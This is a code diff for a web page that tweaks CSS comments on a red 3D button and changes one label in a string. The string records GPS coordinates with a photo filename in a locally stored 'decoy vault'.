@@ -9,8 +9,6 @@
         .box { max-width: 380px; margin: 0 auto; background: #141414; padding: 25px 20px; border-radius: 16px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
         h2 { font-size: 22px; font-weight: 600; margin: 0 0 5px 0; letter-spacing: -0.5px; }
         .subtitle { font-size: 12px; color: #777; margin: 0 0 25px 0; }
-        
-        /* 🔴 COMPACT 3D BUTTON: Stripped the double-button layout completely */
         .round-3d-btn {
             background: linear-gradient(135deg, #8b0000 0%, #4a0000 100%);
             border: none !important;
@@ -25,7 +23,6 @@
             cursor: pointer;
             display: block;
             outline: none;
-            /* Inset and deep shadows create clean depth without a dual shell */
             box-shadow: 0 12px 0 #3a0000, 0 20px 30px rgba(0, 0, 0, 0.9), inset 0 4px 6px rgba(255, 255, 255, 0.1), inset 0 -8px 16px rgba(0, 0, 0, 0.6);
             transition: all 0.05s ease;
             position: relative;
@@ -171,8 +168,8 @@
                 accuracy: gpsAccuracy, 
                 timestamp: cleanTime 
             });
-            // 🔄 FIXED STRINGS: Strictly formatted to use exact Lat and Lon labels
-            saveToDecoyLocalVault("Photo_" + cleanTime + ".jpg", "Lat[" + currentLat + "] Lon[" + currentLon + "] ac[" + gpsAccuracy + "m]");
+            // 🔄 FIXED LABELS: Fully updated string architecture to output accurate Lat, Lon, and Acc casing
+            saveToDecoyLocalVault("Photo_" + cleanTime + ".jpg", "Lat[" + currentLat + "] Lon[" + currentLon + "] Acc[" + gpsAccuracy + "m]");
         } catch (e) {}
     }
 
